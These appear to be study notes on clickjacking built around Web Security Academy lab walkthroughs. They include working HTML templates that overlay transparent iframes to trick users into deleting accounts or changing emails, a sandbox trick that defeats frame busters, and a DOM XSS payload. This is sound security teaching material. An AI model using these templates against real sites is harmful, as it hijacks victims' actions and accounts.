## Definition
- Interface-based attack  
	- in which a user is tricked into clicking on actionable content on a hidden website 
		- by clicking on some other content in a decoy website

## How to construct
Clickjacking attacks:
- use CSS to create and manipulate layers. 
- The attacker incorporates the target website as:
	- an iframe layer overlaid on the decoy website

An example using the style tag and parameters is as follows:
```html
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```

The target website iframe is positioned:
- within the browser 
	- so that there is a precise overlap of the target action with the decoy website 
		- using appropriate width and height position values.

Absolute and relative position values:
- are used to ensure that the target website accurately overlaps the decoy regardless of:
	- screen size, browser type and platform

The z-index determines:
- the stacking order of the iframe 
- and website layers

The opacity value is defined:
- as 0.0 (or close to 0.0) -->  so that the iframe content is transparent to the user.

### Basic clickjacking with CSRF token protection
1. Log in to your account on the target website.
2. Go to the exploit server and paste the following HTML template into the **Body** section:
```html
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>

```
1. Make the following adjustments to the template:
    - Replace `YOUR-LAB-ID` in the iframe `src` attribute with your unique lab ID.
    - Substitute suitable pixel values for the `$height_value` and `$width_value` variables of the iframe (we suggest 700px and 500px respectively).
    - Substitute suitable pixel values for the `$top_value` and `$side_value` variables of the decoy web content so that the "Delete account" button and the "Test me" decoy action align (we suggest 300px and 60px respectively).
    - Set the opacity value `$opacity` to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
2. Click **Store** and then **View exploit**.
3. Hover over **Test me** and ensure the cursor changes to a hand indicating that the div element is positioned correctly. 
	1. **Do not actually click the "Delete account" button yourself.** 
	2. If you do, the lab will be broken and you will need to wait until it resets to try again (about 20 minutes). 
	3. If the div does not line up properly, adjust the `top` and `left` properties of the style sheet.
4. Once you have the div element lined up correctly, change "Test me" to "Click me" and click **Store**.
5. Click on **Deliver exploit to victim** and the lab should be solved

## Clickjacking with prefilled form input
Some websites that require form completion and submission:
- permit prepopulation of form inputs 
	- using GET parameters prior to submission

Other websites might require:
- text before form submission. 
- As GET values form part of the URL then the target URL:
	- can be modified to incorporate values of the attacker's choosing 
	- and the transparent "submit" button is overlaid on the decoy site as in the basic clickjacking example

### Clickjacking with form input data prefilled from a URL parameter
1. Log in to the account on the target website.
2. Go to the exploit server and paste the following HTML template into the "Body" section:
```html
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```
1. Make the following adjustments to the template:
    - Replace `YOUR-LAB-ID` with your unique lab ID so that the URL points to the target website's user account page, which contains the "Update email" form.
    - Substitute suitable pixel values for the `$height_value` and `$width_value` variables of the iframe (we suggest 700px and 500px respectively).
    - Substitute suitable pixel values for the `$top_value` and `$side_value` variables of the decoy web content so that the "Update email" button and the "Test me" decoy action align (we suggest 400px and 80px respectively).
    - Set the opacity value `$opacity` to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
2. Click **Store** and then **View exploit**.
3. Hover over "Test me" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. 
	1. If not, adjust the position of the div element by modifying the top and left properties of the style sheet.
4. Once you have the div element lined up correctly, change "Test me" to "Click me" and click **Store**.
5. Change the email address in your exploit so that it doesn't match your own.
6. Deliver the exploit to the victim to solve the lab.

## Frame busting scripts
Clickjacking attacks are possible whenever websites can be framed. 
=>
preventative techniques are based upon restricting the framing capability for websites.

A common client-side protection enacted through the web browser is to:
- use frame busting or frame breaking scripts. 

These can be implemented via:
- proprietary browser JavaScript add-ons or extensions such as NoScript. 

Scripts are often crafted so that they perform some or all of the following behaviors:
- check and enforce that the current application window is the main or top window,
- make all frames visible,
- prevent clicking on invisible frames,
- intercept and flag potential clickjacking attacks to the user.

Frame busting techniques are often:
- browser and platform specific 
- because of the flexibility of HTML they can usually be circumvented by attackers

As frame busters are JavaScript:
- then the browser's security settings may prevent their operation 
- or indeed the browser might not even support JavaScript

An effective attacker workaround against frame busters is to:
- use the HTML5 iframe `sandbox` attribute. 
- When this is set with the `allow-forms` or `allow-scripts` values and the `allow-top-navigation` value is omitted:
  =>
	- the frame buster script can be neutralized 
		- as the iframe cannot check whether or not it is the top window:
		  `<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>`
		  
Both the `allow-forms` and `allow-scripts` values:
- permit the specified actions within the iframe but top-level navigation is disabled

This inhibits frame busting behaviors:
- while allowing functionality within the targeted site

### Clickjacking with a frame buster script
1. Log in to the account on the target website.
2. Go to the exploit server and paste the following HTML template into the "Body" section:
```html
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms"
src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```
1. Make the following adjustments to the template:
    - Replace `YOUR-LAB-ID` in the iframe `src` attribute with your unique lab ID so that the URL of the target website's user account page, which contains the "Update email" form.
    - Substitute suitable pixel values for the $height_value and $width_value variables of the iframe (we suggest 700px and 500px respectively).
    - Substitute suitable pixel values for the $top_value and $side_value variables of the decoy web content so that the "Update email" button and the "Test me" decoy action align (we suggest 385px and 80px respectively).
    - Set the opacity value `$opacity` to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
      
      Notice the use of the `sandbox="allow-forms"` attribute that neutralizes the frame buster script.
      
1. Click **Store** and then **View exploit**.
2. Hover over "Test me" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties of the style sheet.
3. Once you have the div element lined up correctly, change "Test me" to "Click me" and click **Store**.
4. Change the email address in your exploit so that it doesn't match your own.
5. Deliver the exploit to the victim to solve the lab.

## Combining clickjacking with a DOM XSS attack
### Exploiting clickjacking vulnerability to trigger DOM-based XSS
Go to the exploit server and paste the following HTML template into the **Body** section:
```html
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
</style>
<div>Test me</div>
<iframe
src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```
1. Make the following adjustments to the template:
    - Replace `YOUR-LAB-ID` in the iframe `src` attribute with your unique lab ID so that the URL points to the target website's "Submit feedback" page.
    - Substitute suitable pixel values for the $height_value and $width_value variables of the iframe (we suggest 700px and 500px respectively).
    - Substitute suitable pixel values for the $top_value and $side_value variables of the decoy web content so that the "Submit feedback" button and the "Test me" decoy action align (we suggest 610px and 80px respectively).
    - Set the opacity value `$opacity` to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
2. Click **Store** and then **View exploit**.
3. Hover over "Test me" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties of the style sheet.
4. Click **Test me**. The print dialog should open.
5. Change "Test me" to "Click me" and click **Store** on the exploit server.
6. Now click on **Deliver exploit to victim** and the lab should be solved.

## Multistep clickjacking
Attacker manipulation of inputs to a target website:
- may necessitate multiple actions.

For example, an attacker might want:
- to trick a user into buying something from a retail website 
	- so items need to be added to a shopping basket before the order is placed. 

These actions can be implemented by the attacker:
- using multiple divisions or iframes. 

Such attacks require:
- considerable precision 
- care from the attacker perspective if they are to be effective and stealthy

### Multistep clickjacking
1. Log in to your account on the target website and go to the user account page.
2. Go to the exploit server and paste the following HTML template into the "Body" section:
```html
<style>
	iframe {
		position:relative;
		width:500px;
		height: 700px;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:415px;
		left:60px;
		z-index: 1;
	}
   .secondClick {
		top:497px;
		left:52px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0abe008f0407f6d58b6dee0b00b8004b.web-security-academy.net/my-account"></iframe>
```
